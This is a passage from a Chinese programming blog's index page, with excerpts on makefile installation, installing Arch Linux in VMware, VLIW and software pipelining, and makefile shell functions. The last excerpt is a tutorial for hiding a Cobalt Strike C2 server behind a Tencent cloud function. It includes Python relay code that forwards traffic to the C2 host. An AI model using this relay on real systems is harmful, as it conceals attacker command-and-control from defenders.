#include &lt;iostream&gt; #include &lt;thread&gt; using namespace std; int main(int argc,char* argv[]) { int sec = 1; if(argc &gt; 1) sec=atoi(argv[1]); for(int i;;i++) { cout&lt;&lt;"test install"&lt;&lt;i&lt;&lt;endl; this_thread::sleep_for(chrono::seconds(sec)); } return 0; } # test_install/makefile TARGET=test_install OBJS=test_install.o CC:=g++ OUT=/usr $(TARGET):$(OBJS) install:$(TARGET) @echo "begin install "$(TARGET) cp $(TARGET) $(OUT)/bin/ @echo $(TARGET) "install success!" .PHONY:install 执行make install后，我们在任何路径下输入test_install就可以执行程序了。也可以通过make OUT=./out这种方式指定安装路径。
编写安装函数 # test_install/makefile TARGET=test_install OBJS=test_install.o CC:=g++ OUT=/usr define Install @echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/790cb0a24d0b53cd550348353e130c7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95960f8b768d6388c4eb06dc04a59b1d/" rel="bookmark">
			2021年vmware安装archlinux
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在看文章或者一些视频中偶尔能看到archlinux的身影。本人就比较好奇这个发行版本，好奇就安装试试吧。本文记录一下我自己的安装过程。
补充：
过程中我发现一个UP做的视频非常细致，有需要的去看这个视频就能搞定啦。《保姆级ArchLinux安装教程》
下载 下载导航页面如下：
https://archlinux.org/download/
我最终下载的是http://mirrors.163.com/archlinux/iso/2021.03.01/
下载完成后，建议比较一下文件的md5值。mac下载是：
~/Downloads $ md5 archlinux-2021.03.01-x86_64.iso [10:35:00] MD5 (archlinux-2021.03.01-x86_64.iso) = 954ccc00409d564938433611e3a81ae9 创建虚拟机 虚拟机配置，我设置内存1G 硬盘20G仅供参考。
启动虚拟机 等待加载，很快就进行了如下界面。
根据提示，我进下面地址看一下如何安装。
https://wiki.archlinux.org/index.php/Installation_guide
确保是否为 UEFI 模式 ls /sys/firmware/efi/efivars 如果输出一堆东西，说明就是UEFI模式的了。
测试网络 ping www.baidu.com 若能看到数据返回，即说明已经联网，ctrl+c 终止退出当前命令。
我的是直接可以连接，如果遇到网络不通的话自己百度解决。
启用SSH（可选） 此项为补充内容，第一次安装时候所有命令都是直接在vmware中敲的。vmware中命令行无法复制，粘贴纯手打效率不高。所以我就想能不能ssh远程安装方便粘贴命令？答案是可以的而且很简单。
查ip 执行 ip addr 我这里查到的ip 是 172.16.184.11设置root密码 passwd root客户端连接ssh 命令如下：ssh root@172.16.184.11
简单的3步就可以粘贴命令了，复制粘贴要程序员的本能。 禁用 reflector 2020 年新版 archliveiso 加入了 reflector 服务，它会自己更新
mirrorlist。在特定情况下，它会误删某些有用的源信息。这里联网后的第一件事就是将其禁用。也许它是一个好用的工具，但是很明显，它并不适合在安装的时候启用。
systemctl stop reflector.service 更新系统时钟 timedatectl set-ntp true #将系统时间与网络时间进行同步 timedatectl status #检查服务状态 更换国内镜像源加快下载速度 这一步很关键，我第一次安装，根据官方文档一步步安装，后来在安装步骤等待了1个多小时，还没成功，被迫放弃重新来一遍。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95960f8b768d6388c4eb06dc04a59b1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7de6019c246e1017132b26aff2cec6d/" rel="bookmark">
			超长指令字、软流水
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念：
超长指令字（Very Long Instruction Word，简称VLIW）将多条并行执行的指令看成一条长指令，VLIW处理器的工作工程可以看成是每一条长指令的取指、译码、执行过程，甚至长指令字因此而得名。
软流水：
软流水是编译器优化循环代码的一种指令调度策略，用于在循环的多次迭代中提高指令的并行性。软件流水顾名思义，就是对软件（这里特指循环）进行类似的流水线调度。软件流水也称为循环级并行。
例子：
每次循环称为一次迭代（Iteration），每次迭代执行3条指令：K1、K2、K3（如去数、计算、存数） ，传统的程序执行过程如下：
而采用软件流水技术，程序的执行过程如下：
进流水的阶段称为Loop Prolog，全速并行的阶段称为Loop Kernel，出流水线的阶段称为Loop Epilog。
超长指令字成功的关键在于：
编译器是否能将高级语言翻译成并行性足够好的指令序列。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c45190a2b7e336861e7bea62d0e4b49c/" rel="bookmark">
			Makefile学习笔记10|makefile获取shell结果实现目录创建判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Makefile学习笔记10|makefile获取shell结果实现目录创建判断 希望看到这篇文章的朋友能在评论区留下宝贵的建议来让我们共同成长，谢谢。
这里是目录 本节研究一下在makefile中如何执行shell脚本并得到其运行结果，进而改写、优化前面的makefile。可以将前面默认TARGET:=test改成默认TARGET为目录的名称。通过前面的学习，我们知道makefile分为目标、依赖、代码三个部分。代码部分就可以执行shell脚本。本节的侧重点是如何得到shell脚本的执行结果。通常情况下，得到shell脚本的执行结果有三个方案。一是将shell脚本的执行结果重定向到文件中，再读取文件内容。显然，这种方案有些麻烦，并不是最佳选择。二是使用makefile自带的函数。下面我们来学习相关的函数。
shell函数 先创建一个独立的makefile，测试一下shell函数的用法。
# test.mk LDIR=$(shell pwd) LSS=$(shell ls) test: @echo $(LDIR) @echo $(LSS) make一下(make -f test.mk)就能看到当前路径与该路径下的所有文件的文件名被打印出来了。有一个问题我们必须搞懂，那就是shell是在何时被执行的呢？是在给变量赋值时(LSS=$(shell ls))呢？还是在使用变量时(@echo $(LSS))呢？下面我们改写test.mk做个实验来探究一番。
# test.mk LDIR=$(shell pwd) LSS=$(shell ls) TMP=$(shell echo 111&gt;222) test: @echo $(LDIR) @echo $(LSS) 如果shell是在给变量赋值时执行，则应该生成一个名为222的文件。make一下(make -f test.mk)后发现并没有生成名为222的文件。由此可知，shell是在使用变量时执行的，我们可以把这个赋值看做是#define宏定义，在执行时替换。
应用 下面我们做一个关于makefile中shell的应用。应用的功能是判断当前目录下是否存在名为out的文件夹，如果不存在则创建该文件夹，如果存在则不做任何事。
# app.mk OUT:=out INIT=$(shell if [ ! -d $(OUT) ]; then mkdir $(OUT); fi;) test: @echo $(INIT) 优化makefile头文件 下面我们把今天学到的知识应用到上一节的makefile头文件上，将默认TARGET:=test改成默认TARGET为目录的名称。
# ../makefile.mk # 给TARGET一个默认值 ifndef TARGET TARGET:=$(notdir $(shell pwd)) endif # 这里的CXXFLAGS根据需要修改。其他变量同理。 CXXFLAGS:=-I.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c45190a2b7e336861e7bea62d0e4b49c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83b84a88d33fce3576af8a3c3d52504a/" rel="bookmark">
			Makefile学习笔记09|include外部文件定义统一的makefile头文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Makefile学习笔记09|include外部文件定义统一的makefile头文件 希望看到这篇文章的朋友能在评论区留下宝贵的建议来让我们共同成长，谢谢。
这里是目录 本节我们解决一个问题。前面我们写了很多makefile，但是里面涉及一个问题，就是多数项目的结构都是一样的。如果我们可以统一出一个makefile头文件，供所有的makefile引用，就可以降低项目维护的成本。以后开发的项目只需要移植现成的makefile，修改一些参数即可，这样可以有效提高开发效率。下面就学习如何导入外部makefile。
导入外部makefile——定义统一的makefile.head 项目路径：~/make/src/test_include。创建文件：test_include.cpp、testcpp.cc、testc.c、makefile、…/makefile.mk。本节还将测试cpp程序中调用C语言的函数。makefile引用上层目录的makefile.mk。五个文件内容如下：
// test_include.cpp #include &lt;iostream&gt; extern void TestCpp(); extern "C" void TestC(); using namespace std; int main(int argc,char* argv[]) { TestCpp(); TestC(); return 0; } // testcpp.cc #include &lt;iostream&gt; void TestCpp() { std::cout&lt;&lt;"TestCpp\n"; } // testc.c #include &lt;stdio.h&gt; void TestC() { printf("TestC\n"); } # makefile # 包含三个文件：test_include.cpp testcpp.cc testc.c # 要自动添加这三个文件进行编译 TARGET:=test_include include ../makefile.mk # 可以根据子项目的需要追加CXXFLAGS CXXFLAGS:=$(CXXFLAGS) -std=c++17 # ../makefile.mk # 给TARGET一个默认值 ifndef TARGET TARGET:=test endif # 这里的CXXFLAGS根据需要修改。其他变量同理。 CXXFLAGS:=-I.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83b84a88d33fce3576af8a3c3d52504a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ae2c14beace8e52e839668166808ca9/" rel="bookmark">
			云函数隐藏c2服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		云函数隐藏C2服务器 （有手就能配置） 0x01 前言 自己踩到的坑点主要就是
1、上线地址要去掉http://和:80
基于CS,隐藏C2服务器的手法有很多，常见如下：
域前置CDN第三方代理软件（heroku）云函数 记录一下利用腾讯云的云函数隐藏C2服务器。
壁画不多说直接开始…
0x02环境配置 需要准备：
注册腾讯云账号vps一台cs（我用的4.3） 1、登陆腾讯云控制台，输入云函数
2、新建函数服务
3、函数名称随意，选择从头开始，环境填Python3.6，选完后下拉，把代码搞里头。
4、打码的地方填vps的地址（代码在下面），填完点完成，后会弹出一个提示框点击 留在此页面
C2地址的地方少掉了一个单引号，当时测试的时候也是一直不上线，最后排查的时候找到了。
云函数的Python代码 # -*- coding: utf8 -*- import json,requests,base64 def main_handler(event, context): C2='http://&lt;C2服务器地址&gt;' # 这里可以使用 HTTP、HTTPS~下角标~ path=event['path'] headers=event['headers'] print(event) if event['httpMethod'] == 'GET' : resp=requests.get(C2+path,headers=headers,verify=False) else: resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False) print(resp.headers) print(resp.content) response={ "isBase64Encoded": True, "statusCode": resp.status_code, "headers": dict(resp.headers), "body": str(base64.b64encode(resp.content))[2:-1] } return response 5、点击触发管理，创建触发器
6、配置如下，点击提交
7、点击api服务名
8、点击编辑后到达此页面，路径修改为/ ，点击下一步
9、配置如下 点击完成 后点击 发布服务
10、配置cs的profile文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ae2c14beace8e52e839668166808ca9/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/110/">«</a>
	<span class="pagination__item pagination__item--current">111/220</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/112/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>